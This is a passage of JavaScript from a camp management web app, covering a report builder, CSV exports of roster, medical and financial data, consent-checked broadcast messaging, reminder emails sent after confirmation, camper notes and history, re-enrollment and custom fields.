    _rbDraft.filters=Array.prototype.map.call(document.querySelectorAll('.rbFilter'),function(el){
        return {field:el.querySelector('.rbfField').value,op:el.querySelector('.rbfOp').value,value:el.querySelector('.rbfVal').value};
    });
    var schFreqEl=document.getElementById('rbSchedFreq');
    var schRecipEl=document.getElementById('rbSchedRecipients');
    _rbDraft.schedule={freq:schFreqEl?schFreqEl.value:'off',recipients:schRecipEl?schRecipEl.value.trim():''};
}
function rbSourceChange(v){
    _rbSyncFromDom();
    var sources=_reportSources();
    _rbDraft.source=v;
    // Reset fields to a sensible default and clear now-invalid filters/group.
    _rbDraft.fields=(sources[v]||sources.campers).fields.slice(0,6).map(function(f){return f.key;});
    _rbDraft.filters=[]; _rbDraft.groupBy='';
    document.getElementById('rbBody').innerHTML=_rbInner();
}
function rbAddFilter(){
    _rbSyncFromDom();
    var wrap=document.getElementById('rbFilters');
    var div=document.createElement('div');
    div.innerHTML=_rbFilterRow({},_rbDraft.filters.length);
    wrap.appendChild(div.firstChild);
}
function rbPreview(){
    _rbSyncFromDom();
    var RB=window.ReportBuilderCore; if(!RB){ toast('Report engine not loaded'); return; }
    var res=_computeReport(_rbDraft);
    var host=document.getElementById('rbPreview');
    var cnt=document.getElementById('rbPreviewCount');
    if(cnt) cnt.textContent=res.total+' row'+(res.total===1?'':'s')+(_rbDraft.groupBy?' · '+res.groups.length+' groups':'');
    if(!_rbDraft.fields.length){ host.innerHTML='<div style="font-size:.78rem;color:var(--err)">Pick at least one field.</div>'; return; }
    host.innerHTML=_reportTablesHtml(res,8);
}

function _computeReport(rep){
    var RB=window.ReportBuilderCore;
    var sources=_reportSources();
    var src=sources[rep.source]||sources.campers;
    var fields=(rep.fields||[]).map(function(k){ var d=src.fields.filter(function(x){return x.key===k;})[0]; return {key:k,label:d?d.label:k}; });
    var rows;
    if(rep.mode==='snapshot'&&Array.isArray(rep.snapshotRows)){
        rows=rep.snapshotRows;
    }else{
        rows=RB.applyFilters(src.rows(),rep.filters);
    }
    var groups=RB.groupRows(rows,rep.groupBy);
    return {fields:fields,groups:groups,total:rows.length,sourceLabel:src.label,rows:rows};
}

// Render grouped result tables. limit>0 truncates rows per group (preview).
function _reportTablesHtml(res,limit){
    if(!res.total) return '<div style="font-size:.82rem;color:var(--s400);padding:10px 0">No rows match.</div>';
    var grouped=!(res.groups.length===1&&res.groups[0].key==='');
    var h='';
    res.groups.forEach(function(g){
        if(grouped) h+='<div style="font-size:.8rem;font-weight:700;color:var(--s700);margin:10px 0 4px">'+esc(g.key)+' <span style="color:var(--s400);font-weight:500">('+g.count+')</span></div>';
        h+='<div class="me-tw"><table class="me-t"><thead><tr>';
        res.fields.forEach(function(f){ h+='<th>'+esc(f.label)+'</th>'; });
        h+='</tr></thead><tbody>';
        var rws=(limit&&limit>0)?g.rows.slice(0,limit):g.rows;
        rws.forEach(function(r){
            h+='<tr>'+res.fields.map(function(f){return '<td>'+esc(String(r[f.key]==null?'':r[f.key]))+'</td>';}).join('')+'</tr>';
        });
        if(limit&&g.rows.length>limit) h+='<tr><td colspan="'+res.fields.length+'" style="color:var(--s400);font-size:.75rem">…'+(g.rows.length-limit)+' more</td></tr>';
        h+='</tbody></table></div>';
    });
    return h;
}

function saveCurrentReport(){
    _rbSyncFromDom();
    if(!_rbDraft.name.trim()){ toast('Give the report a name'); return; }
    if(!_rbDraft.fields.length){ toast('Pick at least one field'); return; }
    if(_rbDraft.schedule&&_rbDraft.schedule.freq!=='off'&&!_rbDraft.schedule.recipients){
        toast('Add at least one recipient email for scheduled delivery','error'); return;
    }
    var rep={
        id:_rbDraft.id||('rep_'+Date.now().toString(36)+Math.random().toString(36).slice(2,6)),
        name:_rbDraft.name.trim(), source:_rbDraft.source,
        fields:_rbDraft.fields.slice(), filters:_rbDraft.filters.slice(),
        groupBy:_rbDraft.groupBy, mode:_rbDraft.mode,
        schedule:(_rbDraft.schedule&&_rbDraft.schedule.freq!=='off')?{freq:_rbDraft.schedule.freq,recipients:_rbDraft.schedule.recipients}:null,
        updatedAt:new Date().toISOString()
    };
    if(rep.mode==='snapshot'){
        // Freeze the currently-matching records.
        var RB=window.ReportBuilderCore;
        var src=_reportSources()[rep.source];
        rep.snapshotRows=RB.applyFilters(src.rows(),rep.filters);
        rep.snapshotAt=new Date().toISOString();
    }
    var idx=savedReports.findIndex(function(r){return r.id===rep.id;});
    if(idx>=0){
        var old=savedReports[idx];
        if(old.createdAt) rep.createdAt=old.createdAt;
        // Preserve lastSentAt only if the schedule itself didn't change — a new
        // freq/recipient list means "start fresh," not "skip until the old cadence would have fired."
        if(rep.schedule&&old.schedule&&old.schedule.freq===rep.schedule.freq&&old.schedule.recipients===rep.schedule.recipients&&old.schedule.lastSentAt){
            rep.schedule.lastSentAt=old.schedule.lastSentAt;
        }
        savedReports[idx]=rep;
    }
    else { rep.createdAt=new Date().toISOString(); savedReports.unshift(rep); }
    _rbDraft=null;
    closeModal('dynModal');
    save(); renderReports();
    toast('Report saved');
}

function runSavedReport(id){
    var rep=savedReports.filter(function(r){return r.id===id;})[0]; if(!rep) return;
    var res=_computeReport(rep);
    var body='<div style="font-size:.78rem;color:var(--s400);margin-bottom:8px">'+res.total+' row'+(res.total===1?'':'s')
        +(rep.mode==='snapshot'?' · snapshot from '+esc((rep.snapshotAt||'').split('T')[0]):' · live')+'</div>'
        +'<div style="display:flex;gap:6px;margin-bottom:10px"><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.printSavedReport(\''+esc(id)+'\')">🖨 Print / PDF</button>'
        +'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.exportSavedReport(\''+esc(id)+'\')">↓ Export CSV</button></div>'
        +'<div style="max-height:52vh;overflow:auto">'+_reportTablesHtml(res,0)+'</div>';
    showModal(rep.name,body);
}

function exportSavedReport(id){
    var rep=savedReports.filter(function(r){return r.id===id;})[0]; if(!rep) return;
    var RB=window.ReportBuilderCore; var res=_computeReport(rep);
    var csv=RB.toCSV(res.rows,res.fields,res.groups);
    dlCsv('campistry_'+(rep.name.replace(/[^a-z0-9]+/gi,'_').toLowerCase())+'_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}

function printSavedReport(id){
    var rep=savedReports.filter(function(r){return r.id===id;})[0]; if(!rep) return;
    var res=_computeReport(rep);
    var campName=''; try{ campName=(JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}').campName)||''; }catch(e){}
    var grouped=!(res.groups.length===1&&res.groups[0].key==='');
    var body='';
    res.groups.forEach(function(g){
        if(grouped) body+='<h2>'+esc(g.key)+' <span style="color:#888;font-weight:400">('+g.count+')</span></h2>';
        body+='<table><thead><tr>'+res.fields.map(function(f){return '<th>'+esc(f.label)+'</th>';}).join('')+'</tr></thead><tbody>';
        g.rows.forEach(function(r){ body+='<tr>'+res.fields.map(function(f){return '<td>'+esc(String(r[f.key]==null?'':r[f.key]))+'</td>';}).join('')+'</tr>'; });
        body+='</tbody></table>';
    });
    var w=window.open('','_blank'); if(!w){ toast('Allow pop-ups to print'); return; }
    var css='body{font-family:Arial,Helvetica,sans-serif;color:#222;margin:24px}h1{font-size:18pt;margin:0 0 2px}h2{font-size:12pt;margin:16px 0 6px;color:#333}'
        +'.sub{color:#666;font-size:10pt;margin-bottom:10px}table{width:100%;border-collapse:collapse;font-size:9.5pt;margin-bottom:12px}'
        +'th,td{border:1px solid #ccc;padding:4px 7px;text-align:left}th{background:#f3f3f3}@media print{.noprint{display:none}}';
    w.document.write('<!doctype html><html><head><meta charset="utf-8"><title>'+esc(rep.name)+'</title><style>'+css+'</style></head><body>'
        +'<h1>'+esc(rep.name)+'</h1><div class="sub">'+esc(campName||'')+(campName?' · ':'')+res.total+' rows'+(rep.mode==='snapshot'?' · snapshot':'')+'</div>'
        +body+'<div class="noprint" style="text-align:center;margin-top:16px"><button onclick="window.print()" style="padding:8px 24px;cursor:pointer">Print / Save as PDF</button></div>'
        +'</body></html>');
    w.document.close();
}

async function deleteSavedReport(id){
    var rep=savedReports.filter(function(r){return r.id===id;})[0]; if(!rep) return;
    var ok=await confirmDialog({title:'Delete Report?',message:'Delete report "'+rep.name+'"?',confirmLabel:'Delete',danger:true});
    if(!ok) return;
    var idx=savedReports.indexOf(rep);
    savedReports=savedReports.filter(function(r){return r.id!==id;});
    save(); renderReports();
    toast('Report deleted','ok',{actionLabel:'Undo',onAction:function(){
        savedReports.splice(Math.min(idx,savedReports.length),0,rep);
        save(); renderReports(); toast('Report restored');
    }});
}

function dlCsv(name,csv){
    var blob=new Blob(['\uFEFF'+csv],{type:'text/csv'});
    var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;a.click();toast('Downloaded '+name);
}
function exportRosterReport(){
    var csv='Name,Alternate Name,Camper ID,Division,Grade,Bunk,DOB,Gender,School,Parent 1,Parent 1 Phone,Parent 1 Email,Street,City,State,ZIP,Allergies,Medications,Dietary\n';
    Object.entries(roster).sort(function(a,b){return a[0].localeCompare(b[0])}).forEach(function([n,c]){
        var altN=[c.altFirstName,c.altLastName].filter(Boolean).join(' ');
        csv+=[n,altN,c.camperId||'',c.division||'',c.grade||'',c.bunk||'',c.dob||'',c.gender||'',c.school||'',c.parent1Name||'',c.parent1Phone||'',c.parent1Email||'',c.street||'',c.city||'',c.state||'',c.zip||'',c.allergies||'',c.medications||'',c.dietary||''].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
    });
    dlCsv('campistry_roster_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}
function exportFamilyReport(){
    var csv='Family,Campers,Primary Parent,Phone,Email,Address,Total Paid,Balance,Status\n';
    Object.values(families).sort(function(a,b){return(a.name||'').localeCompare(b.name||'')}).forEach(function(f){
        var pp=(f.households||[])[0]?.parents?.[0]||{};
        var addr=(f.households||[])[0]?.address||'';
        var status=f.balance>0?'Outstanding':f.totalPaid>0?'Paid':'Pending';
        csv+=[f.name||'',(f.camperIds||[]).join('; '),pp.name||'',pp.phone||'',pp.email||'',addr,f.totalPaid||0,f.balance||0,status].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
    });
    dlCsv('campistry_families_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}
// Printable family roster (Save-as-PDF) — the print side of "print & export for
// families" from the March update.
function printFamilies(){
    var campName='';
    try{ campName=(JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}').campName)||''; }catch(e){}
    var rows=Object.values(families).sort(function(a,b){return(a.name||'').localeCompare(b.name||'')}).map(function(f){
        var pp=(f.households||[])[0]?.parents?.[0]||{};
        var kids=(f.camperIds||[]).map(function(n){return esc(n)}).join(', ');
        return '<tr><td>'+esc(f.name||'')+'</td><td>'+kids+'</td><td>'+esc(pp.name||'')+'</td><td>'+esc(pp.phone||'')+'</td><td>'+esc(pp.email||'')+'</td><td class="right">'+fm(f.balance||0)+'</td></tr>';
    }).join('');
    var w=window.open('','_blank');
    if(!w){ toast('Allow pop-ups to print'); return; }
    var css='body{font-family:Arial,Helvetica,sans-serif;color:#222;margin:24px}h1{font-size:18pt;margin:0 0 12px}'
        +'table{width:100%;border-collapse:collapse;font-size:10pt}th,td{border:1px solid #ccc;padding:5px 8px;text-align:left}'
        +'th{background:#f3f3f3}.right{text-align:right}@media print{.noprint{display:none}}';
    w.document.write('<!doctype html><html><head><meta charset="utf-8"><title>Families'+(campName?' — '+esc(campName):'')+'</title><style>'+css+'</style></head><body>'
        +'<h1>'+esc(campName||'Camp')+' — Families ('+Object.keys(families).length+')</h1>'
        +'<table><thead><tr><th>Family</th><th>Campers</th><th>Primary Parent</th><th>Phone</th><th>Email</th><th class="right">Balance</th></tr></thead><tbody>'+rows+'</tbody></table>'
        +'<div class="noprint" style="text-align:center;margin-top:18px"><button onclick="window.print()" style="padding:8px 24px;cursor:pointer">Print / Save as PDF</button></div>'
        +'</body></html>');
    w.document.close();
}
function exportEnrollmentReport(){
    var csv='Camper,Session,Status,Applied Date,Tuition,Discount,Paid,Balance,Payment Status,Forms Done\n';
    Object.values(enrollments).sort(function(a,b){return(a.camperName||'').localeCompare(b.camperName||'')}).forEach(function(e){
        var disc=e.discount?(e.discount.amt||0):0;
        csv+=[e.camperName||'',e.session||'',e.status||'',e.appliedDate||'',e.sessionTuition||0,disc,0,0,e.paymentStatus||'',e.formsCompleted||0].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
    });
    dlCsv('campistry_enrollment_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}
function exportDivisionReport(){
    var csv='Division,Grade,Bunk,Camper Count\n';
    Object.entries(structure).forEach(function([div,d]){
        Object.entries(d.grades||{}).forEach(function([grade,g]){
            (g.bunks||[]).forEach(function(bunk){
                var count=Object.values(roster).filter(function(c){return c.bunk===bunk}).length;
                csv+=[div,grade,bunk,count].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
            });
        });
    });
    dlCsv('campistry_divisions_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}
function exportMedicalReport(){
    var csv='Name,Division,Bunk,Allergies,Medications,Dietary,Emergency Contact,Emergency Phone\n';
    Object.entries(roster).filter(function([,c]){return c.allergies||c.medications||c.dietary}).sort(function(a,b){return a[0].localeCompare(b[0])}).forEach(function([n,c]){
        csv+=[n,c.division||'',c.bunk||'',c.allergies||'',c.medications||'',c.dietary||'',c.emergencyName||'',c.emergencyPhone||''].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n';
    });
    dlCsv('campistry_medical_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}
function exportFinancialReport(){
    var csv='Type,Date,Description,Amount,Category\n';
    finPayments.forEach(function(p){csv+=['Payment',p.date||'',p.family||'',p.amount||0,p.method||''].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n'});
    finExpenses.forEach(function(e){csv+=['Expense',e.date||'',e.desc||'','-'+(e.amount||0),e.cat||''].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n'});
    finStaff.forEach(function(s){csv+=['Payroll','',s.name+' ('+s.role+')','-'+(s.salary||0),s.type||''].map(function(v){return'"'+String(v).replace(/"/g,'""')+'"'}).join(',')+'\n'});
    dlCsv('campistry_financial_'+new Date().toISOString().split('T')[0]+'.csv',csv);
}

// ═══════════════════════════════════════════════════════════════
// BROADCAST EMAIL/SMS DELIVERY
// ═══════════════════════════════════════════════════════════════
async function sendBroadcastNow(broadcast){
    var recipients=[];
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.camp_name||ss.campName||'Camp'}catch(e){}
    var target=(broadcast.to||'').toLowerCase();
    if(target==='staff'||target==='staff only'){
        finStaff.forEach(function(s){if(s.email)recipients.push({email:s.email,name:s.name,phone:'',consent:!!s.smsEmailConsent})});
    }else{
        Object.values(families).forEach(function(f){(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email)recipients.push({email:p.email,name:p.name||'',phone:p.phone||'',consent:!!p.smsEmailConsent})})})});
        var seen=new Set();recipients=recipients.filter(function(r){if(seen.has(r.email))return false;seen.add(r.email);return true});
        if(target!=='all families'&&target!=='enrolled'&&target!=='all'&&target){
            var divCampers=new Set();Object.entries(roster).forEach(function([n,c]){if(c.division===broadcast.to)divCampers.add(n)});
            var divEmails=new Set();Object.values(families).forEach(function(f){if((f.camperIds||[]).some(function(n){return divCampers.has(n)}))(f.households||[]).forEach(function(hh){(hh.parents||[]).forEach(function(p){if(p.email)divEmails.add(p.email)})})});
            recipients=recipients.filter(function(r){return divEmails.has(r.email)});
        }
    }
    if(!recipients.length){toast('No recipients with email','error');return{sent:0,failed:0}}
    // send-broadcast now requires campId (auth check) and per-recipient
    // consent (smsEmailConsent, captured on the registration/staff-apply
    // forms) — a recipient added before that consent flow existed is
    // correctly skipped rather than texted/emailed without consent on file.
    try{return await callEdgeFunctionAuthed('send-broadcast',{campId:getCampId(),to:recipients,subject:broadcast.subject||'',body:broadcast.body||'',method:broadcast.method||'Email',campName:campName,eventKey:'me-broadcast:'+(broadcast.timestamp||Date.now())})}
    catch(err){toast('Send failed: '+err.message,'error');return{sent:0,failed:0}}
}

// ═══════════════════════════════════════════════════════════════
// AUTOMATED NOTIFICATIONS
// ═══════════════════════════════════════════════════════════════
async function sendAutoNotification(type,enrollmentId){
    var e=enrollments[enrollmentId];if(!e)return;
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.camp_name||ss.campName||'Camp'}catch(ex){}
    if(!e.parentEmail)return;
    try{await callEdgeFunction('auto-notify',{recipients:[{email:e.parentEmail,name:e.parentName||''}],type:type,data:{campName:campName,camperName:e.camperName||'',parentName:e.parentName||'',amount:fm(e.sessionTuition||0)}})}catch(err){console.error('[Me] Auto-notify:',err)}
}
async function sendPaymentReminders(){
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.camp_name||ss.campName||'Camp'}catch(ex){}
    var today=new Date().toISOString().split('T')[0];var sevenDays=new Date(Date.now()+7*86400000).toISOString().split('T')[0];
    // ★ pre-collect recipients so we can CONFIRM before emailing real parents (no silent mass-send).
    var jobs=[];
    Object.entries(enrollments).forEach(function([eid,e]){if(e.status!=='enrolled'||!e.installments)return;e.installments.forEach(function(inst){if(inst.status!=='pending')return;if(inst.dueDate===sevenDays||inst.dueDate===today||(inst.dueDate&&inst.dueDate<today)){if(e.parentEmail){var type=inst.dueDate<today?'payment_overdue':'payment_reminder';jobs.push({email:e.parentEmail,name:e.parentName||'',type:type,data:{campName:campName,camperName:e.camperName||'',parentName:e.parentName||'',amount:fm(inst.amount||0),dueDate:inst.dueDate}})}}})});
    if(!jobs.length){toast('No payment reminders due','error');return}
    var okPr=await confirmDialog({title:'Send Payment Reminders?',message:'Send '+jobs.length+' payment reminder email'+(jobs.length!==1?'s':'')+' to parents now? This emails them immediately.',confirmLabel:'Send',danger:false});
    if(!okPr)return;
    jobs.forEach(function(j){callEdgeFunction('auto-notify',{recipients:[{email:j.email,name:j.name}],type:j.type,data:j.data}).catch(function(){})});
    toast(jobs.length+' payment reminder'+(jobs.length!==1?'s':'')+' sent');
}
async function sendFormReminders(){
    var campName='';try{var ss=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campName=ss.camp_name||ss.campName||'Camp'}catch(ex){}
    loadForms();
    var jobs=[];
    campForms.filter(function(f){return f.required}).forEach(function(f){var completed=new Set((f.responses||[]).map(function(r){return r.camper}));Object.entries(roster).forEach(function([name,c]){if(completed.has(name))return;if(!c.parent1Email)return;jobs.push({email:c.parent1Email,name:c.parent1Name||'',data:{campName:campName,camperName:name,parentName:c.parent1Name||'',formName:f.name}})})});
    if(!jobs.length){toast('No form reminders to send','error');return}
    var okFr=await confirmDialog({title:'Send Form Reminders?',message:'Send '+jobs.length+' form reminder email'+(jobs.length!==1?'s':'')+' to parents now? This emails them immediately.',confirmLabel:'Send',danger:false});
    if(!okFr)return;
    jobs.forEach(function(j){callEdgeFunction('auto-notify',{recipients:[{email:j.email,name:j.name}],type:'form_reminder',data:j.data}).catch(function(){})});
    toast(jobs.length+' form reminder'+(jobs.length!==1?'s':'')+' sent');
}

// ═══════════════════════════════════════════════════════════════
// CAMPER NOTES & TIMELINE
// ═══════════════════════════════════════════════════════════════
function addCamperNote(camperName){
    var h='<div class="me-modal-form"><div class="me-field"><label>Note Type</label><select id="noteType" class="me-input"><option>General</option><option>Parent Communication</option><option>Behavior</option><option>Medical</option><option>Bunk Change</option><option>Incident</option><option>Financial</option></select></div><div class="me-field"><label>Note</label><textarea id="noteBody" class="me-input" rows="4" style="resize:vertical" placeholder="What happened..."></textarea></div></div>';
    showModal('Add Note — '+camperName,h,function(){
        var body=document.getElementById('noteBody').value.trim();if(!body){toast('Enter a note','error');return}
        if(!roster[camperName])return;if(!roster[camperName].notes)roster[camperName].notes=[];
        roster[camperName].notes.push({type:document.getElementById('noteType').value,body:body,date:new Date().toISOString(),by:'office'});
        save();closeModal('dynModal');viewCamper(camperName);toast('Note added');
    });
}
function renderCamperTimeline(camperName){
    var d=roster[camperName];if(!d)return'';var notes=d.notes||[];
    if(!notes.length)return'<div style="font-size:.8rem;color:var(--s400);font-style:italic">No notes yet</div>';
    var colors={General:'var(--s500)','Parent Communication':'var(--me)',Behavior:'var(--warn)',Medical:'var(--purple)','Bunk Change':'var(--ok)',Incident:'var(--err)',Financial:'#2563EB'};
    return notes.slice().reverse().map(function(n){var c=colors[n.type]||'var(--s500)';var dt=n.date?new Date(n.date).toLocaleDateString('en-US',{month:'short',day:'numeric',hour:'numeric',minute:'2-digit'}):'';return'<div style="display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--s100)"><div style="width:3px;border-radius:2px;background:'+c+';flex-shrink:0"></div><div style="flex:1"><div style="display:flex;justify-content:space-between"><span style="font-size:.7rem;font-weight:600;color:'+c+'">'+esc(n.type)+'</span><span style="font-size:.65rem;color:var(--s400)">'+esc(dt)+'</span></div><div style="font-size:.8rem;color:var(--s700)">'+esc(n.body)+'</div></div></div>'}).join('');
}

// Camper fields tracked in the change history, with display labels.
var _CAMPER_FIELD_LABELS={
    altFirstName:'Alt First',altLastName:'Alt Last',dob:'DOB',gender:'Gender',school:'School',schoolGrade:'School Grade',teacher:'Teacher',
    division:'Division',grade:'Grade',bunk:'Bunk',team:'Team',
    street:'Street',city:'City',state:'State',zip:'ZIP',
    parent1Name:'Parent',parent1Phone:'Parent Phone',parent1Email:'Parent Email',
    emergencyName:'Emergency Contact',emergencyPhone:'Emergency Phone',emergencyRel:'Emergency Relation',
    allergies:'Allergies',medications:'Medications',dietary:'Dietary',medicalNotes:'Medical Notes',
    physician:'Physician',physicianPhone:'Physician Phone',insuranceProvider:'Insurance',insurancePolicy:'Policy #',
    camperType:'Camper Type',swimLevel:'Swim Level',shirtSize:'Shirt Size',bunkmateRequest:'Bunkmate Request',separateFrom:'Do Not Bunk With'
};
function _diffCamperFields(oldR,newR){
    var out=[];
    Object.keys(_CAMPER_FIELD_LABELS).forEach(function(k){
        var a=oldR[k]==null?'':String(oldR[k]);
        var b=newR[k]==null?'':String(newR[k]);
        if(a!==b) out.push({field:k,label:_CAMPER_FIELD_LABELS[k],from:a,to:b});
    });
    return out;
}
function renderCamperHistory(camperName){
    var d=roster[camperName];if(!d)return'';
    var hist=Array.isArray(d.history)?d.history:[];
    // Fold in enrollment status changes so the profile shows the full story.
    var enrollEvents=[];
    Object.keys(enrollments).forEach(function(id){
        var e=enrollments[id]; if(!e||e.camperName!==camperName)return;
        (e.statusHistory||[]).forEach(function(sh){
            enrollEvents.push({ts:sh.date,type:'status',label:(e.session?e.session+': ':'')+(sh.from?sh.from+' → ':'')+sh.to,by:sh.by});
        });
    });
    var rows=[];
    hist.forEach(function(h){ rows.push(h); });
    enrollEvents.forEach(function(e){ rows.push(e); });
    if(!rows.length)return'<div style="font-size:.8rem;color:var(--s400);font-style:italic">No history yet</div>';
    rows.sort(function(a,b){return String(b.ts||'').localeCompare(String(a.ts||''));});
    return rows.slice(0,60).map(function(h){
        var dt=h.ts?new Date(h.ts).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}):'';
        var head,detail='';
        if(h.type==='created'){ head='Camper created'; }
        else if(h.type==='status'){ head='Enrollment '+esc(h.label)+(h.by?' <span style="color:var(--s400)">('+esc(h.by)+')</span>':''); }
        else { // edit
            head=(h.changes||[]).length+' field'+((h.changes||[]).length===1?'':'s')+' changed';
            detail=(h.changes||[]).map(function(c){
                var from=c.from?esc(c.from):'—', to=c.to?esc(c.to):'—';
                return '<div style="font-size:.72rem;color:var(--s500)">'+esc(c.label)+': <span style="text-decoration:line-through;color:var(--s400)">'+from+'</span> → <strong>'+to+'</strong></div>';
            }).join('');
        }
        return '<div style="display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--s100)"><div style="width:3px;border-radius:2px;background:var(--s300);flex-shrink:0"></div><div style="flex:1"><div style="display:flex;justify-content:space-between"><span style="font-size:.76rem;font-weight:600;color:var(--s700)">'+head+'</span><span style="font-size:.65rem;color:var(--s400)">'+esc(dt)+'</span></div>'+detail+'</div></div>';
    }).join('');
}

// ═══════════════════════════════════════════════════════════════
// RE-ENROLLMENT / RETURNING FAMILIES
// ═══════════════════════════════════════════════════════════════
function reEnrollCamper(camperName){
    var d=roster[camperName];if(!d)return;
    var sesOpts=sessions.map(function(s){return'<option value="'+esc(s.name)+'">'+esc(s.name)+' — '+fm(s.tuition)+'</option>'}).join('');
    var h='<div class="me-modal-form"><p style="font-size:.85rem;color:var(--s600);margin-bottom:14px">Re-enroll <strong>'+esc(camperName)+'</strong> for a new session. All info carried over.</p><div style="background:var(--s50);padding:12px;border-radius:var(--r);margin-bottom:14px;font-size:.8rem"><strong>'+esc(d.division||'')+'/'+esc(d.bunk||'')+'</strong> · Parent: '+esc(d.parent1Name||'')+'</div><div class="me-field"><label>Session</label><select id="reSession" class="me-input">'+sesOpts+'</select></div></div>';
    showModal('Re-Enroll Camper',h,function(){
        var session=document.getElementById('reSession').value;var sesObj=sessions.find(function(s){return s.name===session});
        var id='enr_'+Date.now()+'_'+Math.random().toString(36).substr(2,4);
        enrollments[id]={camperName:camperName,camperLast:camperName.split(' ').pop(),parentName:d.parent1Name||'',parentEmail:d.parent1Email||'',parentPhone:d.parent1Phone||'',dob:d.dob||'',gender:d.gender||'',school:d.school||'',schoolGrade:d.schoolGrade||'',street:d.street||'',city:d.city||'',state:d.state||'',zip:d.zip||'',allergies:d.allergies||'',medications:d.medications||'',session:session,sessionTuition:sesObj?sesObj.tuition:0,status:'accepted',appliedDate:new Date().toISOString().split('T')[0],formsRequired:3,formsCompleted:0,paymentStatus:'pending',notes:'Re-enrollment — returning camper',isReturning:true};
        save();closeModal('dynModal');_refreshPplIfActive();toast(camperName+' re-enrolled (auto-accepted)');
        if(d.parent1Email)sendAutoNotification('enrollment_confirmation',id);
    });
}

// ═══════════════════════════════════════════════════════════════
// CUSTOM FIELDS
// ═══════════════════════════════════════════════════════════════
var customFields=[];
function loadCustomFields(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');customFields=(s.campistryMe&&s.campistryMe.customFields)||[]}
function saveCustomFields(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    if(!s.campistryMe)s.campistryMe={};
    s.campistryMe.customFields=customFields;
    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
        window.saveGlobalSettings('campistryMe',s.campistryMe);
}
function manageCustomFields(){
    loadCustomFields();
    var h='<p style="font-size:.85rem;color:var(--s600);margin-bottom:14px">Define custom fields that appear on every camper profile.</p><div id="cfList">';
    customFields.forEach(function(f,i){h+='<div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--s100)"><span style="flex:1;font-size:.85rem;font-weight:600">'+esc(f.label)+'</span><span style="font-size:.7rem;color:var(--s400)">'+esc(f.type)+'</span><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe._removeCustomField('+i+')">x</button></div>'});
    if(!customFields.length) h+='<div style="font-size:.8rem;color:var(--s400);text-align:center;padding:12px">No custom fields</div>';
    h+='</div><div style="border-top:1px solid var(--s200);margin-top:14px;padding-top:14px"><div style="display:grid;grid-template-columns:2fr 1fr;gap:8px"><input type="text" id="cfNewLabel" class="me-input" placeholder="Field name"><select id="cfNewType" class="me-input"><option value="text">Text</option><option value="select">Dropdown</option><option value="number">Number</option><option value="checkbox">Yes/No</option></select></div><div id="cfOptWrap" style="display:none;margin-top:6px"><input type="text" id="cfOpts" class="me-input" placeholder="Options (comma separated)"></div><button class="me-btn me-btn--pri me-btn--sm" style="margin-top:8px" onclick="CampistryMe._addCustomField()">+ Add Field</button></div>';
    showModal('Manage Custom Fields',h);
    setTimeout(function(){var s=document.getElementById('cfNewType');if(s)s.onchange=function(){document.getElementById('cfOptWrap').style.display=s.value==='select'?'block':'none'}},100);
}
function _addCustomField(){var l=(document.getElementById('cfNewLabel').value||'').trim();if(!l){toast('Enter name','error');return}var t=document.getElementById('cfNewType').value||'text';var o=t==='select'?(document.getElementById('cfOpts').value||'').split(',').map(function(x){return x.trim()}).filter(Boolean):[];customFields.push({label:l,type:t,options:o,id:'cf_'+Date.now()});saveCustomFields();save();closeModal('dynModal');manageCustomFields();toast('Field added')}
function _removeCustomField(i){customFields.splice(i,1);saveCustomFields();save();closeModal('dynModal');manageCustomFields();toast('Removed')}

// ═══════════════════════════════════════════════════════════════
// DOCUMENT ATTACHMENTS
// ═══════════════════════════════════════════════════════════════
function uploadDocument(camperName){
    var inp=document.createElement('input');inp.type='file';inp.accept='.pdf,.jpg,.jpeg,.png,.doc,.docx';
    inp.onchange=function(){if(!inp.files[0])return;var file=inp.files[0];if(file.size>5*1024*1024){toast('Max 5MB','error');return}
    var reader=new FileReader();reader.onload=function(e){if(!roster[camperName])return;if(!roster[camperName].documents)roster[camperName].documents=[];roster[camperName].documents.push({name:file.name,type:file.type,size:file.size,data:e.target.result,uploadDate:new Date().toISOString()});save();viewCamper(camperName);toast('Uploaded: '+file.name)};reader.readAsDataURL(file)};inp.click();
}
function renderDocuments(camperName){
    var docs=(roster[camperName]&&roster[camperName].documents)||[];if(!docs.length)return'<div style="font-size:.8rem;color:var(--s400);font-style:italic">No documents</div>';
